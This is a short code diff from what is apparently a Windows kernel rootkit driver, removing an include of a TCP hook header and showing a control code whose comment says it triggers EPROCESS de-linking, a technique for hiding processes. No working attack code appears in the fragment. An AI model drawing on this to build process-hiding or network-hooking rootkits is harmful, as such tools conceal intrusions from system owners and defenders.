@@ -1,5 +1,5 @@
 #include "driver.h"
-#include "tcphook.h"
+
 
 // IRP code that will call our EPROCESS de-link functionality
 #define IRP_ROOTKIT_CODE 0x815
